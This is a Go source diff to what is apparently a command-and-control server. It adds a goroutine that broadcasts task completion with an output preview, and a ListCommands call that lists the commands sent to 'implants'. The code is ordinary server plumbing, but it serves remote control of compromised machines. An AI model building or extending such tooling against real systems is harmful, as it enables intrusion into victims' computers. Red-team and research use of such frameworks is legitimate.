@@ -213,6 +213,32 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 		logrus.Errorf("Error: %s", result.Error)
 	}
 
+	// Helper to broadcast task completion
+	go func() {
+		// Get implant info for notification
+		s.sessionsMux.RLock()
+		session, exists := s.sessions[result.ImplantId]
+		s.sessionsMux.RUnlock()
+
+		if exists {
+			output := string(result.Output)
+			cutoff := 100
+			if len(output) < cutoff {
+				cutoff = len(output)
+			}
+			preview := output[:cutoff]
+			if len(output) > cutoff {
+				preview += "..."
+			}
+
+			msg := fmt.Sprintf("Task %s completed: %s", result.TaskId, preview)
+			if !result.Success {
+				msg = fmt.Sprintf("Task %s failed: %s", result.TaskId, result.Error)
+			}
+			s.broadcastSessionEvent(pb.SessionEvent_TASK_COMPLETED, session, msg)
+		}
+	}()
+
 	// Store the result so GetCommandResult can retrieve it
 	// Format the payload as expected by parseAndStoreCommandResult: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
 	var payload string
@@ -855,6 +881,46 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 		Output:  result.Output,
 		Error:   result.Error,
 	}, nil
+}
+
+func (s *C2Server) ListCommands(ctx context.Context, req *pb.CommandListRequest) (*pb.CommandListResponse, error) {
+	var dbCommands []DBCommand
+	var err error
+
+	limit := int(req.Limit)
+	if limit <= 0 {
+		limit = 100
+	}
+
+	if req.ImplantId != "" {
+		dbCommands, err = s.db.GetCommandsByImplant(req.ImplantId, limit)
+	} else {
+		dbCommands, err = s.db.GetRecentCommands(limit)
+	}
+
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch commands: %v", err)
+	}
+
+	var commands []*pb.CommandInfo
+	for _, cmd := range dbCommands {
+		// Calculate completed time (approximate based on update updated_at if we had it, or just leave 0 for pending)
+		// For now we just return CreatedAt.
+		// Detailed status check
+
+		info := &pb.CommandInfo{
+			CommandId: cmd.CommandID,
+			ImplantId: cmd.ImplantID,
+			Type:      cmd.Type,
+			Command:   cmd.Command,
+			Status:    cmd.Status,
+			CreatedAt: cmd.CreatedAt.Unix(),
+			// CompletedAt can be populated if status is completed/failed
+		}
+		commands = append(commands, info)
+	}
+
+	return &pb.CommandListResponse{Commands: commands}, nil
 }
 
 func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
